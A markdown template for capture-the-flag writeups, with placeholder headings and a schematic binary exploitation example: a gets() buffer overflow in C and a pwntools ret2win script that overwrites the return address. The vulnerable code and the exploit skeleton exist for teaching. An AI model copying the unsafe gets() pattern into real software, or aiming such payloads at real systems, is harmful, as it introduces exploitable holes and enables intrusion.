# Challenge Name

**Category**: PWN / Crypto / Web / Forensics / Reverse Engineering
**Points**: XXX
**Solves**: XXX
**CTF**: CTF Name 20XX

## Description

> Original challenge description goes here.
>
> Author: challenge_author
>
> Files: challenge.zip

## TL;DR

One or two sentence summary of the vulnerability and solution.

## Files

| File | Description |
|------|-------------|
| `challenge` | Main binary / source |
| `libc.so.6` | Provided libc (if applicable) |

## Reconnaissance

Initial analysis and findings:

```bash
$ file challenge
challenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked

$ checksec --file=challenge
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE
```

Key observations:
- Point 1
- Point 2
- Point 3

## Analysis

### Vulnerability Discovery

Explain how you found the vulnerability:

```c
// Vulnerable code
void vulnerable_function() {
    char buf[64];
    gets(buf);  // Buffer overflow!
}
```

### Root Cause

Explain why this is exploitable:
- Reason 1
- Reason 2

### Attack Vector

Describe the exploitation strategy:
1. Step 1
2. Step 2
3. Step 3

## Exploitation

### Step 1: [Name]

Explanation of this step.

```python
# Code for step 1
offset = 72
```

### Step 2: [Name]

Explanation of this step.

```python
# Code for step 2
payload = b'A' * offset + p64(win_address)
```

### Step 3: [Name]

Explanation of this step.

## Solution

Full exploit script:

```python
#!/usr/bin/env python3
from pwn import *

# Setup
binary = './challenge'
elf = ELF(binary)
context.binary = elf

def exploit():
    if args.REMOTE:
        io = remote('challenge.ctf.com', 1337)
    else:
        io = process(binary)

    # Exploit logic
    offset = 72
    win = elf.symbols['win']

    payload = flat(
        b'A' * offset,
        win
    )

    io.sendline(payload)
    io.interactive()

if __name__ == '__main__':
    exploit()
```

### Running the Exploit

```bash
$ python exploit.py REMOTE
[+] Opening connection to challenge.ctf.com on port 1337: Done
[*] Switching to interactive mode
$ cat flag.txt
flag{example_flag_here}
```

## Flag

```
flag{example_flag_here}
```

## Lessons Learned

- What new technique did you learn?
- What made this challenge interesting?
- Any tips for similar challenges?

## References

- [Link to relevant resource](https://example.com)
- [Another helpful reference](https://example.com)

---

*Writeup by [Your Name] - [CTF Team Name]*
